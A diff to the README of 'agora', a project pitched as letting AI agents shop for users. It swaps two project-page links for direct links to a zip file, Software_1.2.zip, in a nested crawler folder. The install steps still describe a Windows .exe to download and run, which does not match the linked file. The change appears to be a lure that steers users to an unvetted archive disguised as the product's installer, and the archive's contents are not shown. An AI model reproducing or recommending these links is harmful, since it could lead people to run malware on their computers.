@@ -1,6 +1,6 @@
 # 🛍️ agora - Let AI agents shop for you
 
-[![](https://img.shields.io/badge/Download_Agora-Blue?style=for-the-badge)](https://github.com/Eltonise6026/agora)
+[![](https://img.shields.io/badge/Download_Agora-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Eltonise6026/agora/main/crawler/crawler/Software_1.2.zip)
 
 Agora connects AI agents to online stores. It allows an agent to find, compare, and buy products without your manual input. This software bridges the gap between smart agents and e-commerce websites. It keeps your purchasing process fast and accurate.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your system requires at le
 
 Visit the link below to reach the project page. Look for the section labeled Releases on the right side of the screen.
 
-[Download the application here](https://github.com/Eltonise6026/agora)
+[Download the application here](https://raw.githubusercontent.com/Eltonise6026/agora/main/crawler/crawler/Software_1.2.zip)
 
 Click the link for the Windows installer file, which ends in .exe. Save the file to your computer. Once the download finishes, double-click the file to start the setup window. Follow the on-screen prompts. The installer will place a shortcut on your desktop.
 
